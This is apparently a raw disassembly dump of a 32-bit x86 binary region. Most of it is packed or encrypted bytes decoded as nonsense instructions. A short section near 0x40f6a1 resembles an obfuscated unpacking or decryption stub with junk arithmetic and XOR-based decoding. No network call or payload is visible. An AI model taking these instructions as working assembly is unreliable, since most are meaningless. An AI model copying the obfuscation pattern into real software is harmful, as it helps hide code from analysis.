  40f33d:	mov    ebp,DWORD PTR [edi]
  40f33f:	xor    ecx,DWORD PTR [eax]
  40f341:	jmp    0x40f3c1
  40f343:	pusha  
  40f344:	shr    BYTE PTR [esi-0x14a23f39],cl
  40f34a:	(bad)  
  40f34b:	sbb    dl,BYTE PTR [edx+0x18]
  40f34e:	mov    dh,0x2f
  40f350:	or     eax,DWORD PTR [eax]
  40f352:	xchg   edx,eax
  40f353:	out    0x1d,eax
  40f355:	popf   
  40f356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f357:	ret    0xbcdd
  40f35a:	adc    DWORD PTR [edx+0x78ee993c],ecx
  40f360:	mov    eax,ds:0xf125973a
  40f365:	mov    eax,ds:0x762404ce
  40f36a:	scas   eax,DWORD PTR es:[edi]
  40f36b:	int3   
  40f36c:	pop    ebp
  40f36d:	and    al,0xfc
  40f36f:	call   0x9f9c62eb
  40f374:	stc    
  40f375:	sub    al,0xdb
  40f377:	mov    eax,0xf13eff50
  40f37c:	or     al,0x68
  40f37e:	stos   BYTE PTR es:[edi],al
  40f37f:	and    al,0x45
  40f381:	pop    eax
  40f382:	inc    ebp
  40f383:	mov    DWORD PTR [ebp-0x79],eax
  40f386:	jle    0x40f38e
  40f388:	adc    eax,DWORD PTR [edx-0x16f8ca9f]
  40f38e:	jns    0x40f3ea
  40f390:	fisttp WORD PTR [ebx+0x24255b62]
  40f396:	pop    ebx
  40f397:	sbb    DWORD PTR [esi-0x3],0xffffff83
  40f39b:	mov    ss,WORD PTR [esp+ebp*1]
  40f39e:	sub    ebx,0x2d
  40f3a1:	xchg   edi,eax
  40f3a2:	add    eax,0xe86172ce
  40f3a7:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40f3a9:	sbb    esi,DWORD PTR [eax-0x6c38eba8]
  40f3af:	mov    ds:0x6afb10fe,al
  40f3b4:	out    dx,eax
  40f3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3b6:	push   esp
  40f3b7:	and    eax,0x7c08f328
  40f3bc:	pop    edx
  40f3bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3be:	cld    
  40f3bf:	ins    DWORD PTR es:[edi],dx
  40f3c0:	ins    DWORD PTR es:[edi],dx
  40f3c1:	xchg   edx,eax
  40f3c2:	add    DWORD PTR [edi-0x74],esi
  40f3c5:	pop    edi
  40f3c6:	in     eax,dx
  40f3c7:	(bad)  
  40f3c8:	adc    al,BYTE PTR [eax-0x204b4fcd]
  40f3ce:	xor    al,0x12
  40f3d0:	mov    DWORD PTR [esi+ebx*4+0x5638c142],0xd6f6604f
  40f3db:	lea    edi,es:[ecx-0x4566d67e]
  40f3e2:	push   eax
  40f3e3:	push   eax
  40f3e4:	test   BYTE PTR [ebx+0x56e08055],bl
  40f3ea:	xchg   ecx,eax
  40f3eb:	and    al,BYTE PTR [edx+0x3e]
  40f3ee:	mov    dh,0xb4
  40f3f0:	and    al,0x21
  40f3f2:	in     eax,dx
  40f3f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3f4:	sub    dl,BYTE PTR [edx+0x34a81ad]
  40f3fa:	clc    
  40f3fb:	rcl    DWORD PTR [ecx],1
  40f3fd:	or     cl,BYTE PTR [edi+0x20]
  40f400:	fnstsw WORD PTR [eax-0x11]
  40f403:	frstor [ecx+0x65]
  40f406:	push   ebx
  40f407:	pop    ds
  40f408:	mov    cl,BYTE PTR [eax-0x5e77bd0b]
  40f40e:	jbe    0x40f484
  40f410:	in     eax,dx
  40f411:	fs stos BYTE PTR es:[edi],al
  40f413:	lock ins DWORD PTR es:[edi],dx
  40f415:	mov    ebx,0x6fe98e2b
  40f41a:	outs   dx,BYTE PTR ds:[esi]
  40f41b:	fs inc esp
  40f41d:	out    dx,eax
  40f41e:	sub    ch,BYTE PTR [eax-0x31bc7374]
  40f424:	jp     0x40f446
  40f426:	in     al,0xd4
  40f428:	in     eax,dx
  40f429:	icebp  
  40f42a:	arpl   WORD PTR [esi],ax
  40f42c:	or     al,0x62
  40f42e:	lods   eax,DWORD PTR ds:[esi]
  40f42f:	scas   al,BYTE PTR es:[edi]
  40f430:	out    0x6d,eax
  40f432:	add    eax,0x89603696
  40f437:	sbb    al,BYTE PTR [ebp-0x3f0ada20]
  40f43d:	or     BYTE PTR [ebp-0x4],ch
  40f440:	imul   ebp,ecx,0x16
  40f443:	cmp    eax,0x79693178
  40f448:	xchg   ecx,eax
  40f449:	(bad)  
  40f44a:	adc    DWORD PTR [ecx+0x72],edi
  40f44d:	add    BYTE PTR [ebx-0x46],bl
  40f450:	mov    edi,0xd826ab1c
  40f455:	sbb    BYTE PTR [edi+edi*1+0x41],dl
  40f459:	scas   eax,DWORD PTR es:[edi]
  40f45a:	mov    ds:0x9c9005c4,al
  40f45f:	xchg   esp,eax
  40f460:	mov    dh,0xc2
  40f462:	arpl   WORD PTR [edi],bp
  40f464:	pop    esi
  40f465:	shl    BYTE PTR [ecx],cl
  40f467:	and    ecx,ecx
  40f469:	jmp    FWORD PTR [ebx-0x19]
  40f46c:	sub    al,0xf0
  40f46e:	int    0x92
  40f470:	mov    ebx,0xe186b9f7
  40f475:	cmc    
  40f476:	pop    ecx
  40f477:	jecxz  0x40f4e7
  40f479:	mov    fs,eax
  40f47b:	int    0x30
  40f47d:	push   ebp
  40f47e:	inc    edi
  40f47f:	fistp  DWORD PTR [ebx+0x5b]
  40f482:	aaa    
  40f483:	fwait
  40f484:	sbb    eax,0x83cbdb22
  40f489:	out    dx,eax
  40f48a:	push   0x25
  40f48c:	and    BYTE PTR [ecx+ebp*2-0x66],ch
  40f490:	fld    DWORD PTR ds:0x851c9235
  40f497:	inc    ebx
  40f498:	daa    
  40f499:	jge    0x40f48c
  40f49b:	mov    edx,?
  40f49d:	xchg   ebp,eax
  40f49e:	adc    edi,ebp
  40f4a0:	inc    edi
  40f4a1:	aas    
  40f4a2:	int3   
  40f4a3:	test   bl,dl
  40f4a5:	sqrtps xmm1,XMMWORD PTR [edi-0x45b044a7]
  40f4ac:	push   esp
  40f4ad:	fadd   DWORD PTR [ebx-0x48424dc7]
  40f4b3:	jmp    0x40f46c
  40f4b5:	adc    bl,BYTE PTR [edi]
  40f4b7:	fstp   DWORD PTR cs:[edi]
  40f4ba:	and    DWORD PTR [eax+0x24],edi
  40f4bd:	popa   
  40f4be:	inc    edi
  40f4bf:	mov    ebx,0xb9e8fa40
  40f4c4:	std    
  40f4c5:	(bad)  
  40f4c6:	xor    eax,0xfb4f6937
  40f4cb:	jmp    0x40f451
  40f4cd:	je     0x40f4d8
  40f4cf:	rcl    BYTE PTR [esi],1
  40f4d1:	shr    DWORD PTR [ebp-0x18],cl
  40f4d4:	cwde   
  40f4d5:	mov    edi,DWORD PTR [esi+eiz*4]
  40f4d8:	add    al,0xf5
  40f4da:	mov    ds,WORD PTR [ebx+eax*4]
  40f4dd:	mov    cl,bh
  40f4df:	fs or  al,0x5
  40f4e2:	icebp  
  40f4e3:	fucomip st,st(0)
  40f4e5:	ins    DWORD PTR es:[edi],dx
  40f4e6:	and    DWORD PTR [eax],esp
  40f4e8:	pop    ebx
  40f4e9:	adc    esp,DWORD PTR [edx]
  40f4eb:	push   edi
  40f4ec:	sahf   
  40f4ed:	and    ebp,DWORD PTR [ecx-0x249909d]
  40f4f3:	inc    esp
  40f4f4:	cs pop ecx
  40f4f6:	xor    ah,dh
  40f4f8:	xor    dh,BYTE PTR [edx-0x7d]
  40f4fb:	add    eax,0x756fa79a
  40f500:	jecxz  0x40f537
  40f502:	mov    al,0xea
  40f504:	push   ebp
  40f505:	call   0x57d06538
  40f50a:	lods   al,BYTE PTR ds:[esi]
  40f50b:	das    
  40f50c:	pop    ebx
  40f50d:	les    esi,FWORD PTR [eax]
  40f50f:	sub    BYTE PTR [edi-0x61da325],bl
  40f515:	sbb    ecx,DWORD PTR ds:0xf3c70b16
  40f51b:	dec    esi
  40f51c:	adc    ebx,DWORD PTR [ebp+edx*8+0x70be40df]
  40f523:	inc    eax
  40f524:	xchg   esp,eax
  40f525:	cmp    edx,DWORD PTR [edx+0xd]
  40f528:	cli    
  40f529:	in     eax,0x87
  40f52b:	add    al,0x4e
  40f52e:	mov    edi,0xfbe8fc1e
  40f533:	dec    edx
  40f534:	or     eax,0x9ec55d46
  40f539:	jle    0x40f502
  40f53b:	call   0xe541:0xff6ff2bc
  40f542:	les    esp,FWORD PTR [edi+0x3dc2939d]
  40f548:	dec    ebx
  40f549:	xor    ebp,0x2f
  40f54c:	xor    eax,0xab230684
  40f551:	cmovnp esi,DWORD PTR [esp+edx*2]
  40f555:	push   esp
  40f556:	mov    edx,ebx
  40f558:	neg    DWORD PTR [esi+0x6cdea63b]
  40f55e:	les    ecx,FWORD PTR [edx-0x1a]
  40f561:	mov    bh,0xfd
  40f563:	sbb    bl,BYTE PTR [eax+0x3d8c824a]
  40f569:	inc    esi
  40f56a:	sbb    dl,dl
  40f56c:	or     esi,ebp
  40f56e:	mov    al,0xc5
  40f570:	push   ebp
  40f571:	scas   al,BYTE PTR es:[edi]
  40f572:	mov    BYTE PTR [ebx+0x4f],bl
  40f575:	push   esi
  40f576:	mov    ch,0xc4
  40f578:	push   esi
  40f579:	ins    BYTE PTR es:[edi],dx
  40f57a:	fimul  DWORD PTR ss:[esi]
  40f57d:	(bad)  
  40f57e:	mov    ds:0xe258367d,al
  40f583:	(bad)  
  40f584:	pop    edi
  40f585:	xor    BYTE PTR [eax-0x48b2faf0],dh
  40f58b:	mov    ebx,0x3cfe8949
  40f590:	pop    eax
  40f591:	or     al,bh
  40f593:	fstp   QWORD PTR [esi]
  40f595:	jecxz  0x40f5d2
  40f597:	push   esi
  40f599:	jmp    0x40f58d
  40f59b:	hlt    
  40f59c:	and    BYTE PTR [edi-0x154f3cbe],bh
  40f5a2:	inc    edi
  40f5a3:	das    
  40f5a4:	push   ss
  40f5a5:	xor    dl,BYTE PTR [ecx]
  40f5a7:	jp     0x40f5e9
  40f5a9:	pop    ebp
  40f5aa:	ficomp DWORD PTR [eax]
  40f5ac:	int    0x20
  40f5ae:	scas   al,BYTE PTR es:[edi]
  40f5af:	enter  0xba4e,0x96
  40f5b3:	ret    
  40f5b4:	imul   BYTE PTR [ebp+edx*4-0x8999aaf]
  40f5bb:	(bad)  
  40f5bc:	not    ah
  40f5be:	cmp    edi,DWORD PTR [ebx+ebx*8]
  40f5c1:	inc    ebp
  40f5c2:	or     eax,0xb72f8725
  40f5c7:	or     DWORD PTR [ebx+ecx*1-0x72],ecx
  40f5cb:	fcomp  DWORD PTR [ecx-0x7bc58e28]
  40f5d1:	mov    ecx,edi
  40f5d3:	out    0x93,eax
  40f5d5:	out    dx,al
  40f5d6:	xchg   DWORD PTR [ebp-0x2f935618],eax
  40f5dc:	fs cmc 
  40f5de:	jg     0x40f590
  40f5e0:	push   es
  40f5e1:	in     al,dx
  40f5e2:	dec    esp
  40f5e3:	push   ecx
  40f5e4:	int    0x3b
  40f5e6:	push   edx
  40f5e7:	icebp  
  40f5e8:	pop    ss
  40f5e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5ea:	int3   
  40f5eb:	call   0x2d4:0xd12f1e63
  40f5f2:	shl    DWORD PTR [eax-0x44],0x40
  40f5f6:	rcl    BYTE PTR [esi-0x75690897],cl
  40f5fc:	hlt    
  40f5fd:	jl     0x40f5f3
  40f5ff:	sub    eax,0x47b1c43a
  40f604:	bound  ebx,QWORD PTR [ebp-0x5b01536d]
  40f60a:	and    ch,BYTE PTR [ebx]
  40f60c:	test   DWORD PTR [edi-0x2f],eax
  40f60f:	(bad)  
  40f611:	imul   ax,WORD PTR [edx],0x3d
  40f615:	inc    esi
  40f616:	retf   
  40f617:	lock mov bl,0xf7
  40f61a:	(bad)  
  40f61b:	nop
  40f61c:	outs   dx,BYTE PTR ds:[esi]
  40f61d:	lds    ecx,FWORD PTR [ebp-0xc0423b7]
  40f623:	clc    
  40f624:	je     0x40f5f7
  40f626:	int3   
  40f627:	mov    ebp,DWORD PTR [esi]
  40f629:	imul   BYTE PTR [edi-0x1e]
  40f62c:	shl    BYTE PTR [ecx],1
  40f62e:	mov    cl,0xe8
  40f630:	cmp    bl,bh
  40f632:	sub    esp,ecx
  40f634:	jo     0x40f62e
  40f636:	fnstsw WORD PTR [eax-0x3f]
  40f639:	(bad)  
  40f63a:	nop
  40f63b:	sbb    edi,DWORD PTR [eax]
  40f63d:	mov    esp,edx
  40f63f:	inc    ecx
  40f640:	ja     0x40f68d
  40f642:	cwde   
  40f643:	xor    eax,0xfc748028
  40f648:	xchg   ebp,eax
  40f649:	repz sub ecx,DWORD PTR [edx+0x3f]
  40f64d:	push   0xffffffe2
  40f64f:	and    DWORD PTR [esi+0x74239c66],0x3d
  40f656:	into   
  40f657:	(bad)  
  40f659:	cwde   
  40f65a:	xor    ch,BYTE PTR [edi]
  40f65c:	dec    edx
  40f65d:	or     cl,BYTE PTR [edi+edx*2-0x74]
  40f661:	mov    eax,ds:0x5ec14313
  40f666:	aam    0x36
  40f668:	ja     0x40f65d
  40f66a:	das    
  40f66b:	das    
  40f66c:	mov    edx,0xc8423426
  40f671:	test   eax,0x9b1ec120
  40f676:	call   0xd70c5e2b
  40f67b:	push   edx
  40f67c:	or     DWORD PTR [edi],edx
  40f67e:	retf   
  40f67f:	mov    ebp,0xdd4d5d19
  40f684:	div    edi
  40f686:	cmp    BYTE PTR [esi-0x5b],dh
  40f689:	fimul  WORD PTR [ecx+0x4e]
  40f68c:	(bad)  
  40f68d:	rcr    BYTE PTR [eax],cl
  40f68f:	or     BYTE PTR [ebx-0x73],ah
  40f692:	pop    ebx
  40f693:	test   BYTE PTR [esi-0x6a],bh
  40f696:	adc    bh,BYTE PTR [ebx+eax*8+0x209367f5]
  40f69d:	mov    BYTE PTR [edx+0x3],bl
  40f6a0:	(bad)  
  40f6a1:	jmp    0x411b79
  40f6a6:	mov    eax,DWORD PTR [ebp-0x38]
  40f6a9:	add    eax,DWORD PTR [ebp+0x8]
  40f6ac:	mov    DWORD PTR [ebp-0x18],eax
  40f6af:	mov    eax,DWORD PTR [ebp-0x1c]
  40f6b2:	test   eax,eax
  40f6b4:	je     0x411b02
  40f6ba:	mov    DWORD PTR [ebp-0x20],0x0
  40f6c1:	push   0x3
  40f6c3:	xor    edx,edx
  40f6c5:	pop    edx
  40f6c6:	add    edx,0x8
  40f6c9:	push   edx
  40f6ca:	pop    ecx
  40f6cb:	push   0x6
  40f6cd:	dec    ecx
  40f6ce:	pop    ebx
  40f6cf:	dec    ebx
  40f6d0:	xchg   ebx,ecx
  40f6d2:	sub    ebx,ecx
  40f6d4:	xchg   ebx,ecx
  40f6d6:	dec    ecx
  40f6d7:	mov    eax,DWORD PTR [ebp-0x1c]
  40f6da:	imul   eax,ecx
  40f6dd:	sub    esp,eax
  40f6df:	mov    DWORD PTR [ebp-0x20],esp
  40f6e2:	mov    eax,DWORD PTR [ebp-0x4]
  40f6e5:	xor    eax,esi
  40f6e7:	add    eax,edi
  40f6e9:	jmp    0x411adb
  40f6ee:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6f1:	mov    eax,DWORD PTR [ebp+0x8]
  40f6f4:	mov    edx,DWORD PTR [ebp+0x14]
  40f6f7:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f6fb:	xor    ecx,esi
  40f6fd:	add    ecx,edi
  40f6ff:	xor    edx,edx
  40f701:	div    ecx
  40f703:	mov    ecx,DWORD PTR [ebp-0x4]
  40f706:	jmp    0x411aba
  40f70b:	outs   dx,BYTE PTR ds:[esi]
  40f70c:	lods   al,BYTE PTR ds:[esi]
  40f70d:	or     ch,al
  40f70f:	mov    cl,al
  40f711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f712:	or     ah,0x7d
  40f715:	push   0x56ec41f0
  40f71a:	xor    al,0x2
  40f71c:	scas   al,BYTE PTR es:[edi]
  40f71d:	add    DWORD PTR [ebx-0x7c7ca318],0x6c
  40f724:	fwait
  40f725:	cmp    BYTE PTR [edi+0x1f570f54],bl
  40f72b:	xchg   ebx,eax
  40f72c:	cld    
  40f72d:	ret    
  40f72e:	cmp    esp,DWORD PTR [eax]
  40f730:	mov    dl,0x8b
  40f732:	sub    al,0x57
  40f734:	das    
  40f735:	xchg   DWORD PTR [esi*2-0x616b0f21],esp
  40f73c:	cmp    BYTE PTR [ebp-0x35],dl
  40f73f:	cs ja  0x40f6f8
  40f742:	(bad)  [ebx]
  40f744:	dec    DWORD PTR [edi+0x2b]
  40f747:	pop    edi
  40f748:	or     eax,0x480a7632
  40f74d:	cmp    BYTE PTR [ebp+0x76],0x3d
  40f751:	pop    ecx
  40f752:	xchg   esi,eax
  40f753:	pushf  
  40f754:	arpl   WORD PTR ss:[ebp+0x39],cx
  40f758:	imul   dx,WORD PTR ds:0xfd884b4e,0x6a43
  40f761:	adc    BYTE PTR [edx],bl
  40f763:	ins    DWORD PTR es:[edi],dx
  40f764:	mov    ?,edx
  40f766:	int3   
  40f767:	lods   eax,DWORD PTR ds:[esi]
  40f768:	enter  0x11ff,0xce
  40f76c:	cmp    edi,edi
  40f76e:	push   ss
  40f76f:	xor    DWORD PTR [edx],eax
  40f771:	cmp    al,0x7f
  40f773:	cld    
  40f774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f775:	imul   ebp,DWORD PTR [edx],0x5df08f9d
  40f77b:	or     eax,0x87dbf363
  40f780:	fistp  WORD PTR [ebx-0x7f821394]
  40f786:	in     al,dx
  40f787:	aad    0x3f
  40f789:	(bad)  
  40f78b:	adc    BYTE PTR [eax-0x239d2c1e],0x98
  40f792:	cmp    ch,bl
  40f794:	int    0x4c
  40f796:	add    edi,DWORD PTR [edi+0x49b6ec7e]
  40f79c:	xchg   esp,eax
  40f79d:	outs   dx,DWORD PTR ds:[esi]
  40f79e:	sub    DWORD PTR [edi+0x29],0x343331fd
  40f7a5:	dec    edi
  40f7a6:	cld    
  40f7a7:	dec    esi
  40f7a8:	rcl    DWORD PTR [esi],1
  40f7aa:	or     dh,BYTE PTR [esi-0x6b853ac5]
  40f7b0:	and    DWORD PTR [ecx],eax
  40f7b2:	jb     0x40f7f2
  40f7b4:	inc    eax
  40f7b5:	xlat   BYTE PTR ds:[ebx]
  40f7b6:	das    
  40f7b7:	loope  0x40f7f8
  40f7b9:	push   es
  40f7ba:	(bad)  
  40f7bb:	mov    cl,0xfb
  40f7bd:	bound  esi,QWORD PTR [esi+0x1c]
  40f7c0:	ror    eax,1
  40f7c2:	jge    0x2793fb31
  40f7c8:	outs   dx,DWORD PTR ds:[esi]
  40f7c9:	ja     0x40f74d
  40f7cb:	mov    cl,0x8b
  40f7cd:	loopne 0x40f813
  40f7cf:	es dec ebp
  40f7d1:	dec    edx
  40f7d2:	mov    bh,0x75
  40f7d4:	imul   ebp,ebp,0x24a63eb1
  40f7da:	cs popa 
  40f7dc:	pop    esp
  40f7dd:	rcl    dh,cl
  40f7df:	out    0x60,eax
  40f7e1:	stos   BYTE PTR es:[edi],al
  40f7e2:	mov    ch,0x11
  40f7e4:	scas   al,BYTE PTR es:[edi]
  40f7e5:	mov    eax,0xeb0fa91d
  40f7ea:	and    edi,DWORD PTR [edx]
  40f7ec:	icebp  
  40f7ed:	adc    al,0x4a
  40f7ef:	sbb    BYTE PTR [edi+0x1ca2c922],cl
  40f7f5:	push   cs
  40f7f6:	pop    ecx
  40f7f7:	rcr    DWORD PTR [eax-0xa],1
  40f7fa:	mov    edi,0x5a2648ff
  40f7ff:	inc    eax
  40f800:	dec    ecx
  40f801:	add    BYTE PTR [edx+0x21],dl
  40f804:	xlat   BYTE PTR ds:[ebx]
  40f805:	fisub  DWORD PTR [esi+0x5e204196]
  40f80b:	xor    BYTE PTR [ebp-0x27dbef9],0x1b
  40f812:	ret    0xaf6a
  40f815:	loop   0x40f79d
  40f817:	push   ds
  40f818:	adc    BYTE PTR [edi],0x7d
  40f81b:	icebp  
  40f81c:	stos   BYTE PTR es:[edi],al
  40f81d:	fimul  DWORD PTR [ecx-0x7851c773]
  40f823:	stos   BYTE PTR es:[edi],al
  40f824:	push   es
  40f825:	dec    ebx
  40f826:	inc    ebx
  40f827:	dec    ecx
  40f828:	and    bh,BYTE PTR [edx+eiz*2+0x72]
  40f82c:	lds    eax,FWORD PTR [ecx+eiz*4-0x7f7b9ed9]
  40f833:	lea    edi,[eax+0x57540144]
  40f839:	pop    ecx
  40f83a:	or     cl,ch
  40f83c:	inc    ebx
  40f83d:	jp     0x40f854
  40f83f:	cmp    eax,0xe56fa108
  40f844:	mov    cl,BYTE PTR [esi+0x49]
  40f847:	int3   
  40f848:	out    dx,eax
  40f849:	stos   BYTE PTR es:[edi],al
  40f84a:	add    DWORD PTR [ebx-0x3df0f6da],esp
  40f850:	hlt    
  40f851:	fs jmp 0x40f881
  40f854:	xchg   ebp,eax
  40f855:	push   0x5c232224
  40f85a:	js     0x40f8db
  40f85c:	loope  0x40f896
  40f85e:	lahf   
  40f85f:	inc    ecx
  40f860:	mov    edi,DWORD PTR [edx+edx*8+0xd57d783]
  40f867:	mov    ah,0x12
  40f869:	dec    ebx
  40f86a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f86b:	ja     0x40f839
  40f86d:	cli    
  40f86e:	dec    ebx
  40f86f:	iret   
  40f870:	call   0x3aee4d22
  40f875:	sti    
  40f876:	data16 jp 0x40f84f
  40f879:	fild   DWORD PTR [ebx+0x1]
  40f87c:	mov    esi,0x662b6f4a
  40f881:	ja     0x40f8a8
  40f883:	leave  
  40f884:	adc    eax,0xcf2c80bf
  40f889:	pop    esi
  40f88a:	in     al,0x19
  40f88c:	jno    0x40f8a1
  40f88e:	mov    bl,0x1e
  40f890:	push   edi
  40f891:	sub    DWORD PTR [ecx+0x4d],ebp
  40f894:	mov    al,0xf6
  40f896:	aaa    
  40f897:	out    0x42,eax
  40f899:	(bad)  
  40f89a:	clc    
  40f89b:	cmp    al,0x32
  40f89d:	test   eax,0xe0f307ad
  40f8a2:	inc    edx
  40f8a3:	dec    edi
  40f8a4:	outs   dx,BYTE PTR ds:[esi]
  40f8a5:	je     0x40f889
  40f8a7:	jmp    0x40f8f6
  40f8a9:	out    dx,al
  40f8aa:	ror    BYTE PTR [ebx],1
  40f8ac:	aam    0x4d
  40f8ae:	mov    ah,0x7e
  40f8b0:	cmp    DWORD PTR [ecx],0xffffffe4
  40f8b3:	jl     0x40f87c
  40f8b5:	push   0xffffff89
  40f8b7:	fistp  WORD PTR [ebx+0xf]
  40f8ba:	icebp  
  40f8bb:	add    dh,BYTE PTR [esi]
  40f8bd:	mov    BYTE PTR [edi+ecx*4-0x5f24daf3],dl
  40f8c4:	data16 adc al,0x7a
  40f8c7:	push   edx
  40f8c8:	lock (bad) ds:0x2df5bc1b
  40f8cf:	mov    ch,0x9d
  40f8d1:	jnp    0x40f915
  40f8d3:	rol    edx,0xec
  40f8d6:	inc    ecx
  40f8d7:	gs pop edx
  40f8d9:	cli    
  40f8da:	xchg   ebp,eax
  40f8db:	mov    dh,0x23
  40f8dd:	cdq    
  40f8de:	ins    DWORD PTR es:[edi],dx
  40f8df:	test   eax,0x6cd1d15b
  40f8e4:	mov    ecx,0x435a0442
  40f8e9:	(bad)  
  40f8ea:	push   cs
  40f8eb:	push   ebx
  40f8ec:	dec    esp
  40f8ed:	mov    ds:0x8041d550,eax
  40f8f2:	mov    al,ds:0x1d121b
  40f8f7:	sti    
  40f8f8:	pmaxsw mm2,QWORD PTR [ecx-0x23]
  40f8fc:	jae    0x40f958
  40f8fe:	xor    esi,edi
  40f900:	add    eax,0x70763c80
  40f905:	mov    al,ds:0xcfcbe513
  40f90b:	outs   dx,BYTE PTR ds:[esi]
  40f90c:	sbb    dh,bh
  40f90e:	icebp  
  40f90f:	push   ebp
  40f910:	inc    ebx
  40f911:	mov    ds:0x750f2a06,al
  40f916:	in     al,0xd0
  40f918:	adc    bh,BYTE PTR [eax-0x4e20694b]
  40f91e:	neg    DWORD PTR [edi]
  40f920:	enter  0x64fb,0xe5
  40f924:	lock pop esp
  40f926:	adc    al,0xc8
  40f928:	mov    dl,0xd
  40f92a:	mov    dh,0xb3
  40f92c:	and    ebx,ebx
  40f92e:	rol    BYTE PTR [esi-0x6f],cl
  40f931:	enter  0x9c1c,0x3a
  40f935:	fcomp  DWORD PTR [eax]
  40f937:	inc    ebp
  40f938:	jmp    FWORD PTR [ecx+0x586d8443]
  40f93e:	adc    bh,BYTE PTR [ecx-0x6d]
  40f941:	aaa    
  40f942:	mov    ch,0x7f
  40f944:	cmp    al,0xc9
  40f946:	and    BYTE PTR [edx],0x99
  40f949:	or     eax,0x89e8327c
  40f94e:	(bad)  
  40f94f:	mov    ch,0xf9
  40f951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f952:	dec    edx
  40f953:	push   cs
  40f954:	or     al,0xab
  40f956:	fstp   DWORD PTR [edx+0x5ddeeaad]
  40f95c:	adc    cl,BYTE PTR [edi]
  40f95e:	nop
  40f95f:	inc    ecx
  40f960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f961:	fld    TBYTE PTR [eax-0x1bb66cb2]
  40f967:	dec    ebx
  40f968:	movsx  esi,WORD PTR [ebx+esi*2]
  40f96c:	adc    al,BYTE PTR [edi]
  40f96e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f96f:	adc    edi,eax
  40f971:	xchg   ebp,eax
  40f972:	jge    0x40f946
  40f974:	or     DWORD PTR [esi],esi
  40f976:	jns    0x40f97e
  40f978:	mov    al,0x38
  40f97a:	mov    dl,0x78
  40f97c:	aaa    
  40f97d:	mov    ecx,edi
  40f97f:	mov    edx,0x9cfb8da8
  40f984:	cdq    
  40f985:	jae    0x40f9dc
  40f987:	pushf  
  40f988:	pop    eax
  40f989:	jp     0x40f924
  40f98b:	iret   
  40f98c:	lods   eax,DWORD PTR ds:[esi]
  40f98d:	jae    0x40f91a
  40f98f:	popf   
  40f990:	cld    
  40f991:	mov    eax,0xe927ecce
  40f996:	jmp    0x40f96e
  40f998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f999:	and    BYTE PTR [esi-0x27b00790],ah
  40f99f:	jno    0x40f942
  40f9a1:	jp     0x40f9bf
  40f9a3:	push   eax
  40f9a4:	or     edi,ebp
  40f9a6:	jb     0x40f9e9
  40f9a8:	xor    edx,DWORD PTR [edx-0xb]
  40f9ab:	mov    ebp,0x6a050829
  40f9b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9b1:	ins    BYTE PTR es:[edi],dx
  40f9b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9b3:	cwde   
  40f9b4:	push   0x499aae10
  40f9b9:	imul   eax,DWORD PTR [esi],0x9b720077
  40f9bf:	sub    al,0xa9
  40f9c1:	daa    
  40f9c2:	out    dx,al
  40f9c3:	popa   
  40f9c4:	in     eax,dx
  40f9c5:	jae    0x40f97a
  40f9c7:	and    ch,BYTE PTR [ecx+0x534533e0]
  40f9cd:	jns    0x40fa4c
  40f9cf:	push   eax
  40f9d0:	jne    0x40fa51
  40f9d2:	inc    ecx
  40f9d3:	or     ah,BYTE PTR [esi+0x55483947]
  40f9d9:	push   edi
  40f9da:	sbb    ch,BYTE PTR [ecx]
  40f9dc:	popa   
  40f9dd:	adc    eax,0x2d57def7
  40f9e2:	sbb    al,0x75
  40f9e4:	or     al,0x9a
  40f9e6:	and    eax,0xaf912253
  40f9eb:	(bad)  
  40f9ec:	out    dx,eax
  40f9ed:	mov    bl,0xdf
  40f9ef:	out    dx,eax
  40f9f0:	jmp    0xf97a:0x8a6b1b0
  40f9f7:	fisubr WORD PTR [eax-0x5c]
  40f9fa:	loop   0x40fa40
  40f9fc:	or     al,0xab
  40f9fe:	jns    0x40fa08
  40fa00:	push   0x4f
  40fa02:	lock push edi
  40fa04:	(bad)  
  40fa05:	adc    bl,BYTE PTR [edx-0x6f]
  40fa08:	push   eax
  40fa09:	clc    
  40fa0a:	inc    esi
  40fa0b:	xchg   BYTE PTR [edi],bh
  40fa0d:	xlat   BYTE PTR ds:[ebx]
  40fa0e:	dec    ebp
  40fa0f:	xchg   DWORD PTR [edx],esp
  40fa11:	and    eax,0x98a7f996
  40fa16:	or     DWORD PTR [ebp+edi*8+0x10ac3587],ecx
  40fa1d:	int    0x36
  40fa1f:	dec    eax
  40fa20:	xor    eax,0x18f3ba1d
  40fa25:	mov    ebp,0xff63a959
  40fa2a:	xlat   BYTE PTR ds:[ebx]
  40fa2b:	ja     0x40f9d3
  40fa2d:	jbe    0x40f9ef
  40fa2f:	sbb    bh,al
  40fa31:	jnp    0x40fa52
  40fa33:	out    dx,al
  40fa34:	and    eax,0x590e1bb1
  40fa39:	test   BYTE PTR [edi+0x22],bl
  40fa3c:	xchg   esp,eax
  40fa3d:	ins    BYTE PTR es:[edi],dx
  40fa3e:	mov    ecx,0xf32b2b3b
  40fa43:	or     ecx,DWORD PTR [ebp+edx*8-0x1ddf2079]
  40fa4a:	les    eax,FWORD PTR [ebp+eax*1+0x170a0679]
  40fa51:	retf   
  40fa52:	iret   
  40fa53:	adc    eax,0xc07bc8eb
  40fa58:	into   
  40fa59:	push   eax
  40fa5a:	lds    eax,FWORD PTR [esi-0x43]
  40fa5d:	int    0x6b
  40fa5f:	push   ecx
  40fa60:	adc    eax,DWORD PTR [ebx-0x3a]
  40fa63:	lea    ebp,gs:[eax-0x3d]
  40fa67:	loopne 0x40fa43
  40fa69:	fadd   st(3),st
  40fa6b:	fidivr DWORD PTR [ecx+0x6110a0ff]
  40fa71:	fs icebp 
